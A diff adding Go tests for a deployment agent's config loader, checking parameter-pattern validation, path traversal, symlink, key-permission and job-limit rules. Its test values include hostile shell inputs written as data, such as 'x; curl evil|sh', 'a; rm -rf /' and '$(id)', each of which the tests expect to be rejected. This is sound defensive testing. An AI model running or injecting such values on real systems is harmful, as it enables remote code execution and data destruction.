@@ -16,6 +16,7 @@ import (
 	"math/big"
 	"os"
 	"path/filepath"
+	"strings"
 	"testing"
 	"time"
 )
@@ -77,6 +78,7 @@ agent:
     port: 8443
 
 security:
+  allow_service_owned_files: true
   mtls:
     ca_file: ` + caFile + `
     cert_file: ` + certFile + `
@@ -191,6 +193,7 @@ agent:
     address: 0.0.0.0
     port: 8443
 security:
+  allow_service_owned_files: true
   mtls:
     ca_file: ` + ca + `
     cert_file: ` + cert + `
@@ -226,6 +229,7 @@ agent:
     address: 0.0.0.0
     port: 8443
 security:
+  allow_service_owned_files: true
   mtls:
     ca_file: ` + ca + `
     cert_file: ` + cert + `
@@ -257,6 +261,7 @@ agent:
     address: 0.0.0.0
     port: 8443
 security:
+  allow_service_owned_files: true
   mtls:
     ca_file: ` + ca + `
     cert_file: ` + cert + `
@@ -289,6 +294,7 @@ agent:
     address: 0.0.0.0
     port: 8443
 security:
+  allow_service_owned_files: true
   mtls:
     ca_file: ` + ca + `
     cert_file: ` + cert + `
@@ -324,6 +330,7 @@ agent:
     address: 0.0.0.0
     port: 8443
 security:
+  allow_service_owned_files: true
   mtls:
     ca_file: ` + ca + `
     cert_file: ` + cert + `
@@ -393,6 +400,7 @@ agent:
     address: 0.0.0.0
     port: 8443
 security:
+  allow_service_owned_files: true
   mtls:
     ca_file: ` + ca + `
     cert_file: ` + cert + `
@@ -412,6 +420,47 @@ authorization:
 	}
 }
 
+func TestParameter_PatternIsRequired(t *testing.T) {
+	p := Parameter{Type: ParameterTypeString}
+	if err := p.Validate("image_tag"); err == nil {
+		t.Fatalf("expected an error for a parameter with no pattern")
+	}
+}
+
+func TestParameter_UnvalidatedParameterRejectsEveryValue(t *testing.T) {
+	p := Parameter{Type: ParameterTypeString, Pattern: `.+`}
+	if err := p.CheckValue("anything"); err == nil {
+		t.Fatalf("a parameter that never passed Validate must not accept values")
+	}
+}
+
+func TestParameter_PatternMatchesWholeValue(t *testing.T) {
+	tests := []struct {
+		name    string
+		pattern string
+		value   string
+		want    bool
+	}{
+		{"unanchored rejects embedded match", `[a-z]+`, "x; curl evil|sh", false},
+		{"unanchored accepts whole match", `[a-z]+`, "abc", true},
+		{"half-anchored alternation rejects suffix", `^a|b$`, "a; rm -rf /", false},
+		{"half-anchored alternation accepts a", `^a|b$`, "a", true},
+		{"anchored pattern still works", `^[a-z0-9-]+$`, "uat-1", true},
+		{"trailing newline rejected", `[a-z]+`, "abc\n", false},
+	}
+	for _, tc := range tests {
+		t.Run(tc.name, func(t *testing.T) {
+			p := Parameter{Type: ParameterTypeString, Pattern: tc.pattern}
+			if err := p.Validate("v"); err != nil {
+				t.Fatalf("Validate: %v", err)
+			}
+			if got := p.CheckValue(tc.value) == nil; got != tc.want {
+				t.Errorf("CheckValue(%q) accepted = %v, want %v", tc.value, got, tc.want)
+			}
+		})
+	}
+}
+
 func TestParameter_CheckValue(t *testing.T) {
 	p := Parameter{Type: ParameterTypeString, Pattern: `^[a-z0-9-]+$`}
 	if err := p.Validate("image_tag"); err != nil {
@@ -422,5 +471,217 @@ func TestParameter_CheckValue(t *testing.T) {
 	}
 	if err := p.CheckValue("; rm -rf /"); err == nil {
 		t.Errorf("expected shell-metacharacter value to be rejected")
+	}
+}
+
+func loadWithParameterYAML(t *testing.T, parameterYAML string) error {
+	t.Helper()
+	dir := t.TempDir()
+	script := writeFixture(t, dir, "deploy.sh", "#!/bin/sh\n", 0o750)
+	ca := writeFixture(t, dir, "ca.crt", testCertPEM, 0o640)
+	cert := writeFixture(t, dir, "server.crt", testCertPEM, 0o640)
+	key := writeFixture(t, dir, "server.key", testKeyPEM, 0o600)
+
+	content := `
+agent:
+  id: test-agent
+  name: Test Agent
+  listen:
+    address: 0.0.0.0
+    port: 8443
+security:
+  allow_service_owned_files: true
+  mtls:
+    ca_file: ` + ca + `
+    cert_file: ` + cert + `
+    key_file: ` + key + `
+actions:
+  sample.action:
+    command: ` + script + `
+    timeout: 5m
+    parameters:
+` + parameterYAML + `
+authorization:
+  identities: {}
+`
+	_, err := Load(writeFixture(t, dir, "config.yaml", content, 0o640))
+	return err
+}
+
+func TestLoad_RejectsParameterWithoutPattern(t *testing.T) {
+	err := loadWithParameterYAML(t, "      image_tag:\n        type: string\n        required: true\n")
+	if err == nil || !strings.Contains(err.Error(), "pattern is required") {
+		t.Fatalf("Load error = %v, want a \"pattern is required\" error", err)
+	}
+}
+
+func TestLoad_RejectsMalformedParameterPattern(t *testing.T) {
+	err := loadWithParameterYAML(t, "      image_tag:\n        type: string\n        pattern: '[a-z'\n")
+	if err == nil || !strings.Contains(err.Error(), "invalid pattern") {
+		t.Fatalf("Load error = %v, want an \"invalid pattern\" error", err)
+	}
+}
+
+func TestLoad_AcceptsUnanchoredPatternAndEnforcesFullMatch(t *testing.T) {
+	if err := loadWithParameterYAML(t, "      image_tag:\n        type: string\n        pattern: '[a-z]+'\n"); err != nil {
+		t.Fatalf("Load: %v", err)
+	}
+}
+
+func TestParameter_HostileValuesAreRejected(t *testing.T) {
+	p := Parameter{Type: ParameterTypeString, Pattern: `[a-z0-9._-]{1,128}`}
+	if err := p.Validate("image_tag"); err != nil {
+		t.Fatalf("Validate: %v", err)
+	}
+	hostile := map[string]string{
+		"newline":          "abc\ndef",
+		"trailing newline": "abc\n",
+		"carriage return":  "abc\r",
+		"NUL":              "abc\x00def",
+		"escape":           "abc\x1b[0m",
+		"semicolon":        "a;b",
+		"command subst":    "$(id)",
+		"backtick":         "`id`",
+		"pipe":             "a|b",
+		"space":            "a b",
+		"unicode":          "caf\u00e9",
+		"RTL override":     "abc\u202edef",
+		"slash":            "a/b",
+		"too long":         strings.Repeat("a", 129),
+		"empty":            "",
+		"invalid UTF-8":    "a\xffb",
+	}
+	for name, v := range hostile {
+		if err := p.CheckValue(v); err == nil {
+			t.Errorf("%s: value %q was accepted", name, v)
+		}
+	}
+	if err := p.CheckValue("uat-20260823-a81f32c"); err != nil {
+		t.Errorf("legitimate value rejected: %v", err)
+	}
+}
+
+func loadWithCommand(t *testing.T, commandFor func(dir, script string) string) error {
+	t.Helper()
+	dir := t.TempDir()
+	script := writeFixture(t, dir, "deploy.sh", "#!/bin/sh\n", 0o750)
+	ca := writeFixture(t, dir, "ca.crt", testCertPEM, 0o640)
+	cert := writeFixture(t, dir, "server.crt", testCertPEM, 0o640)
+	key := writeFixture(t, dir, "server.key", testKeyPEM, 0o600)
+
+	content := `
+agent:
+  id: test-agent
+  name: Test Agent
+  listen:
+    address: 0.0.0.0
+    port: 8443
+security:
+  allow_service_owned_files: true
+  mtls:
+    ca_file: ` + ca + `
+    cert_file: ` + cert + `
+    key_file: ` + key + `
+actions:
+  sample.action:
+    command: ` + commandFor(dir, script) + `
+    timeout: 5m
+authorization:
+  identities: {}
+`
+	_, err := Load(writeFixture(t, dir, "config.yaml", content, 0o640))
+	return err
+}
+
+func TestLoad_RejectsPathTraversalInCommand(t *testing.T) {
+	err := loadWithCommand(t, func(dir, script string) string {
+		// Concatenated, not filepath.Join, which would clean the ".." away.
+		return dir + "/../" + filepath.Base(dir) + "/deploy.sh"
+	})
+	if err == nil || !strings.Contains(err.Error(), "clean path") {
+		t.Fatalf("Load error = %v, want a clean-path error", err)
+	}
+}
+
+func TestLoad_RejectsSymlinkedCommand(t *testing.T) {
+	err := loadWithCommand(t, func(dir, script string) string {
+		link := filepath.Join(dir, "link.sh")
+		if err := os.Symlink(script, link); err != nil {
+			t.Fatalf("symlink: %v", err)
+		}
+		return link
+	})
+	if err == nil || !strings.Contains(err.Error(), "symlink") {
+		t.Fatalf("Load error = %v, want a symlink error", err)
+	}
+}
+
+func TestLoad_RejectsCommandThatIsADirectoryOrMissing(t *testing.T) {
+	for name, fn := range map[string]func(dir, script string) string{
+		"directory": func(dir, _ string) string { return dir },
+		"missing":   func(dir, _ string) string { return filepath.Join(dir, "absent.sh") },
+	} {
+		if err := loadWithCommand(t, fn); err == nil {
+			t.Errorf("%s: Load accepted the command", name)
+		}
+	}
+}
+
+// config.Load refuses a server private key that other users can read, even
+// when the development opt-in for service-owned files is set: file mode is
+// independent of ownership.
+func TestLoad_RejectsWorldReadablePrivateKey(t *testing.T) {
+	dir := t.TempDir()
+	script := writeFixture(t, dir, "deploy.sh", "#!/bin/sh\n", 0o750)
+	ca := writeFixture(t, dir, "ca.crt", testCertPEM, 0o640)
+	cert := writeFixture(t, dir, "server.crt", testCertPEM, 0o640)
+	key := writeFixture(t, dir, "server.key", testKeyPEM, 0o644)
+	yamlPath := writeFixture(t, dir, "config.yaml", baseYAML(dir, script, ca, cert, key), 0o640)
+
+	_, err := Load(yamlPath)
+	if err == nil || !strings.Contains(err.Error(), "key_file") || !strings.Contains(err.Error(), "accessible by other users") {
+		t.Fatalf("Load = %v, want a key_file permission error", err)
+	}
+}
+
+// Without the development opt-in, the documented layout fails for a
+// non-root test user because every fixture is service-owned; the error must
+// name the problem and the way out instead of failing obscurely.
+func TestLoad_StrictModeNamesServiceOwnedFile(t *testing.T) {
+	if os.Geteuid() == 0 {
+		t.Skip("run as a non-root user")
+	}
+	dir := t.TempDir()
+	script := writeFixture(t, dir, "deploy.sh", "#!/bin/sh\n", 0o750)
+	ca := writeFixture(t, dir, "ca.crt", testCertPEM, 0o640)
+	cert := writeFixture(t, dir, "server.crt", testCertPEM, 0o640)
+	key := writeFixture(t, dir, "server.key", testKeyPEM, 0o600)
+	strict := strings.Replace(baseYAML(dir, script, ca, cert, key), "  allow_service_owned_files: true\n", "", 1)
+	yamlPath := writeFixture(t, dir, "config.yaml", strict, 0o640)
+
+	_, err := Load(yamlPath)
+	if err == nil || !strings.Contains(err.Error(), "root") {
+		t.Fatalf("Load = %v, want an ownership error mentioning root", err)
+	}
+}
+
+func TestLoad_MaxConcurrentBounds(t *testing.T) {
+	for _, tc := range []struct {
+		value   string
+		wantErr bool
+	}{{"1", false}, {"1024", false}, {"0", false /* 0 = default */}, {"-1", true}, {"1025", true}} {
+		dir := t.TempDir()
+		script := writeFixture(t, dir, "deploy.sh", "#!/bin/sh\n", 0o750)
+		ca := writeFixture(t, dir, "ca.crt", testCertPEM, 0o640)
+		cert := writeFixture(t, dir, "server.crt", testCertPEM, 0o640)
+		key := writeFixture(t, dir, "server.key", testKeyPEM, 0o600)
+		content := baseYAML(dir, script, ca, cert, key) + "\njobs:\n  max_concurrent: " + tc.value + "\n"
+		cfg, err := Load(writeFixture(t, dir, "config.yaml", content, 0o640))
+		if (err != nil) != tc.wantErr {
+			t.Errorf("max_concurrent=%s: err = %v, wantErr %v", tc.value, err, tc.wantErr)
+		}
+		if err == nil && tc.value == "0" && cfg.MaxConcurrentJobs != DefaultMaxConcurrentJobs {
+			t.Errorf("default = %d, want %d", cfg.MaxConcurrentJobs, DefaultMaxConcurrentJobs)
+		}
 	}
 }
